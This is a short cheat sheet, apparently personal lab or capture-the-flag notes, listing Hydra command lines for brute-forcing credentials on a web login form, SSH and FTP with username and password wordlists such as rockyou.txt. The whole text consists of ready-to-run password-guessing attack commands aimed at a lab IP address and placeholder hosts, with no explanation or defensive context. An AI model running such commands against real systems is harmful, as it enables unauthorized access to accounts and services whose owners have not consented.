# web login form:
	hydra -L ~/tools/wordlists/society.txt -P ~/.tools/wordlists/rockyou.txt 10.10.25.107 http-post-form "/backdoor/:log=^USER^&pwd=^PWD^: The password you entered for the username" -t 30
# ssh:
    hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
# ftp:
    hydra -l user -P passlist.txt ftp://MACHINE_IP

